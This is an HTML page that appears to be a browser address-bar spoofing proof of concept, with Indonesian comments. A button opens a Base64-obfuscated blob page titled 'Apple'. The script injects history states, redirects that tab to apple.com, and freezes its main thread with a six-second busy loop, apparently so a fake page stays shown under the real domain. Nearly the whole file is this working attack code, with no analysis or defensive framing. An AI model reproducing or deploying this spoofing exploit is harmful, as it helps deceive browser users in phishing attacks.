<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, user-scalable=yes"
    />
    <title>Scheme-Validation & Pipeline Race Engine</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #050507;
        color: #fff;
        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      }
      .container {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100%;
        gap: 16px;
        padding: 20px;
        box-sizing: border-box;
      }
      h1 {
        font-size: 22px;
        margin-bottom: 10px;
        color: #f5f5f7;
        text-align: center;
      }
      button {
        width: 100%;
        max-width: 420px;
        padding: 24px;
        font-size: 20px;
        font-weight: bold;
        background: #ff3b30;
        color: #fff;
        border: none;
        border-radius: 16px;
        cursor: pointer;
        box-shadow: 0 8px 24px rgba(255, 59, 48, 0.45);
        transition: transform 0.1s ease;
      }
      button:active {
        transform: scale(0.96);
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h1>Scheme-Validation Engine</h1>
      <button id="startBtn">EXECUTE SCHEME RACE LOCK</button>
    </div>

    <script>
      document.getElementById("startBtn").onclick = function () {
        this.style.display = 'none';

        // 1. Membangun Payload Self-Healing & History Watchdog dalam format Base64
        const rawPayload = `
          <!DOCTYPE html>
          <html>
          <head>
            <title>Apple</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
          </head>
          <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
            <h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1>
            <script>
              // Watchdog Mandiri untuk mempertahankan struktur DOM
              try {
                const observer = new MutationObserver(() => {
                  if (!document.getElementById('spoof-text')) {
                    document.body.innerHTML = '<h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1>';
                  }
                });
                observer.observe(document.documentElement, { childList: true, subtree: true });
              } catch(e) {}

              // Interval pembersihan history state untuk mengunci pipeline controller
              setInterval(() => {
                try {
                  history.pushState({race: Math.random()}, "", "#scheme-lock");
                  if (!document.getElementById('spoof-text')) {
                    document.body.innerHTML = '<h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1>';
                  }
                } catch(err) {}
              }, 4);
            <\/script>
          </body>
          </html>
        `;

        // Konversi dinamis ke Base64 untuk pengaburan struktur
        const encoded = btoa(unescape(encodeURIComponent(rawPayload)));
        const decoded = decodeURIComponent(escape(atob(encoded)));

        // Membentuk Blob Stream langsung sebagai inisialisasi awal jendela (Bypass about:blank)
        const blob = new Blob([decoded], { type: 'text/html' });
        const blobUrl = URL.createObjectURL(blob);

        // 2. Membuka tab baru menggunakan referensi jendela mandiri
        const newTab = window.open(blobUrl, "_blank");

        if (newTab) {
          try { newTab.focus(); } catch (e) {}

          // 3. Chain Step A (6ms): Menginjeksikan history state sebelum validasi skema selesai
          setTimeout(() => {
            try {
              newTab.history.pushState({scheme_flood: true}, "", "#provisional-state");
            } catch (err) {}
          }, 6);

          // 4. Chain Step B (16ms): Memicu Redirect-Scheme / Target Navigation Race Condition
          setTimeout(() => {
            try {
              newTab.location.href = "https://apple.com";
            } catch (err) {}
          }, 16);

          // 5. Chain Step C (30ms): Mengunci main thread browser secara sinkronus untuk menahan callback konfirmasi
          setTimeout(() => {
            try {
              newTab.eval(`
                const startTime = Date.now();
                while (Date.now() - startTime < 6000) {
                  const reflow = document.body.offsetHeight;
                  document.body.style.backgroundColor = (reflow % 2 === 0) ? '#ffffff' : '#fefefe';
                }
              `);
            } catch (e) {
              let start = Date.now();
              while (Date.now() - start < 6000) {}
            }
          }, 30);
        }
      };
    </script>
  </body>
</html>
